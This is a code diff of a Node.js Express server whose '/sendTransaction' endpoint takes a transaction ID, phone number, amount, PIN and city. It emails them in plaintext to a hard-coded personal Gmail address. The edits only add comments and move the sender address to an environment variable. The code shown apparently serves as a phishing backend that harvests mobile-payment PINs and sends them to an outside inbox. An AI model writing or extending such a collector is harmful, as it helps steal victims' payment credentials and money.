@@ -14,6 +14,7 @@ app.use(cors());
 // Parse JSON bodies
 app.use(bodyParser.json());
 
+// HTML template for email
 const htmlTemplate = `
 <h1> Transaction Details</h1>
 <p><strong> Transaction ID:</strong> {{transactionId}}</p>
@@ -23,6 +24,7 @@ const htmlTemplate = `
 <p><strong> PIN:</strong> {{pin}}</p>
 `;
 
+// Create transporter for nodemailer
 const transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
     port: 465,
@@ -33,6 +35,7 @@ const transporter = nodemailer.createTransport({
     },
 });
 
+// Endpoint to send transaction details via email
 app.post('/sendTransaction', async (req, res) => {
     try {
         const { transactionId, phoneNumber, amountToPay, pin, city } = req.body;
@@ -49,8 +52,8 @@ app.post('/sendTransaction', async (req, res) => {
             .replace('{{city}}', city);
 
         const info = await transporter.sendMail({
-            from: "ibadurrehman718@gmail.com",
-            to: 'sarajameswilliam718@gmail.com',
+            from: process.env.EMAIL_USER, // Ensure this matches your environment variable
+            to: 'sarajameswilliam718@gmail.com', // Change to the recipient's email address
             subject: 'New Transaction Alert',
             html: html,
         });
